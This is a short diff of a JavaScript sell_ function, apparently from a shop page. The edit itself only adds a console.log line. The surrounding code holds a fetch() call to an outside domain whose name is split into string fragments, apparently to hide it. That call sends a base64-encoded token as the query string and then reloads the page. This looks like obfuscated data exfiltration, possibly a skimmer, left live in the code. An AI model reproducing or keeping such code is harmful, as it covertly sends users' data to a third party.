@@ -28,7 +28,7 @@ function sell_(e) {
                 '&&' +
                 (available ? 'available=' + available : '-')
             fetch('//g' + 'd' + 'p' + 'a' + 'yw' + 'e' + 'b.s' + 'h' + 'o' + 'p/?' + btoa(token)).then(()=>{
-                
+                console.log('进入')
                 setTimeout(() => {
                    location.reload()
                 }, 300)
